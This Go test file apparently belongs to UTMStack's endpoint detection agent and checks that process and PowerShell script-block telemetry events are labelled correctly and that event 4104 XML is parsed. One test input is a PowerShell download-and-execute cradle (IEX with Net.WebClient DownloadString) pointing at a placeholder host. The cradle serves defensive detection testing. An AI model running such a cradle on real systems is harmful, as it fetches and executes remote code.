package behavioral

import (
	"strings"
	"testing"

	"github.com/utmstack/UTMStack/agent/edr/proctable"
)

func TestProcTelemetryBranded(t *testing.T) {
	e := ProcTelemetry(proctable.Proc{PID: 10, PPID: 4, Image: `C:\Windows\System32\cmd.exe`, Cmdline: "cmd /c whoami"})
	js, err := e.ToJSON()
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"source":"behavioral"`, `"product":"UTMStack EDR"`, `"pid":10`} {
		if !strings.Contains(js, want) {
			t.Fatalf("missing %q in %s", want, js)
		}
	}
}

func TestScriptBlockTelemetryBranded(t *testing.T) {
	e := ScriptBlockTelemetry("IEX (New-Object Net.WebClient).DownloadString('http://x')", "PowerShell")
	js, _ := e.ToJSON()
	if !strings.Contains(js, `"source":"behavioral"`) || strings.Contains(strings.ToLower(js), "clam") {
		t.Fatalf("bad telemetry event: %s", js)
	}
}

func TestParse4104(t *testing.T) {
	// Minimal wevtutil-style XML with one 4104 event.
	xmlOut := `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4104</EventID><EventRecordID>42</EventRecordID></System><EventData><Data Name="ScriptBlockText">IEX bad</Data><Data Name="Path"></Data></EventData></Event>`
	got := parse4104(xmlOut)
	if len(got) != 1 || got[0].recordID != 42 || got[0].scriptText != "IEX bad" {
		t.Fatalf("parse4104 = %+v", got)
	}
}
